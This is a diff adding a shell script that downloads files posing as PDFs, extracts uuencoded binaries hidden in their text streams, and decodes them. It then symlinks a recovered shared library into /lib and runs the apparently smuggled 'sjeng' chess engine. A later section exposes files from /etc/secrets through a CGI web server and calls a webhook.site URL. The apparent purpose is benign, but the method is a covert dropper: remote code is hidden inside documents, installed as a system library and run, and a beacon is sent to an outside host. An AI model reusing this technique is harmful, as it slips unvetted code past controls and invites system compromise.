@@ -1,0 +1,105 @@
+#!/bin/sh
+
+#cd /lib
+#ln -s /etc/secrets/lib*db*.so.*   #TODO= (JUST) LOSE= both
+
+cd /etc/secrets
+pwd
+
+#echo 'quit' | ./sjeng
+#rm -f ./?tstrapc.pdf
+#rm -f ./eraseme?.???
+#wget 'https://static.wikitide.net/rrfwiki/6/63/Btstrapc.pdf'   #TODO= (JUST) LOSE= all
+
+wget 'https://rawcdn.githack.com/Markworthy-37260/Next0v1.js/1c61477adf880fa9d495f109fa66025bd568fbfc/public/eraseme~.pdf'
+cat ./eraseme~.pdf \
+ | egrep '^\(~[^ ()\\]*~\)[ \t]+ Tj$' | tee ./eraseme6.txt \
+ | tr ' ' '\t' | cut -f1 | tr -d '()' | tee ./eraseme7.txt \
+ | tr '~' ' ' | sed 's/^ *//' | sed 's/ *$//' | tee ./eraseme8.txt \
+ | tr '{|}' '(\\)' | tee ./eraseme9.txt \
+ | uudecode
+#ls -l
+#egrep -v '^$' eraseme_.txt >./sjeng-gz.txt
+head -c-1 eraseme_.txt >./sjeng_gz.txt
+#diff -sq sjeng_gz.txt sjeng-gz.txt
+#md5sum *.*
+#md5sum -c *.md5 || exit
+echo '9a832b6419efee8956ce35ffb4a72885  sjeng_gz.txt' | md5sum -c || exit
+uudecode sjeng_gz.txt
+gunzip -f sj*ng.gz
+#uudecode sjeng-gz.txt
+#ls -l
+#head -3 sjeng?gz.txt
+
+#rm -f ./l?bgdbm.so.6
+touch /root/.sjeng
+echo 'echo "quit" | ./sjeng' | sh
+
+rm -f ./L?bgdbm6.pdf
+wget 'https://static.wikitide.net/rrfwiki/2/2b/Libgdbm6.pdf'
+cat ./L?bgdbm6.pdf \
+ | egrep '^\(~[^ ()\\]*~\)[ \t]+ Tj$' | tee ./eraseme6.txt \
+ | tr ' ' '\t' | cut -f1 | tr -d '()' | tee ./eraseme7.txt \
+ | tr '~' ' ' | sed 's/^ *//' | sed 's/ *$//' | tee ./eraseme8.txt \
+ | tr '{|}' '(\\)' | tee ./eraseme9.txt \
+ | uudecode
+mv ./claim_me.gz ./libgdbm.so.6.gz
+echo 'a8f22f0063c2a2f223f1703d566a427c  libgdbm.so.6.gz' | md5sum -c || exit
+gunzip -f ./*6.gz
+echo 'bdfe1c439fd4148ccb551b7af6dac1fa  libgdbm.so.6' | md5sum -c || exit
+ln -s `realpath .`/lib*.so.* /lib/
+
+touch /root/.sjeng
+echo 'echo "quit" | ./sjeng' | sh
+echo OK
+rm /root/.sjeng
+echo 'echo "quit" | ./sjeng' | sh
+echo OKOK
+echo "quit" | ./sjeng
+echo OKOKOK
+rm -f *.pdf
+rm -f eraseme?.*
+rm -f *_gz.txt
+ls -l
+exit
+
+#WIPWIPWIP:-
+######diff -sq *6 masters/*6 || exit
+##md5sum -c *.md5 || exit
+##uudecode sjeng_gz.txt
+##gunzip sj*ng.gz
+##uudecode sjeng-gz.txt
+##ls -l
+##head -3 sjeng?gz.txt
+##echo 'quit' | ./sjeng
+##exit
+
+############################################################
+
+mkdir /usr/games
+cd /usr/games
+ln -s /etc/secrets/sjeng ./sjeng
+cd /home
+mkdir ./cgi-bin
+cd ./cgi-bin
+ln -s /usr/games/sjeng ./sjeng
+uudecode /etc/secrets/sjcgiout.txt
+ls -l
+sleep 3
+echo 'hi&&there' | ./sjcgi.out 5
+cd ..
+httpd -vv -h . -c /dev/null
+sleep 2
+ps
+sleep 3
+ln -s /etc/secrets/sjeng2s.sh ./cgi-bin/sjeng.cgi
+wget 'http://localhost/cgi-bin/sjeng.cgi?d&force&st?2&e2e4&go&&d&quit'
+sleep 4
+pwd
+ls -l
+sleep 5
+wget 'https://webhook.site/196c27ef-6b06-4196-a24b-36acbf42a9b7?frothy=latte'
+
+sleep 6
+cat ./sjeng
+exit
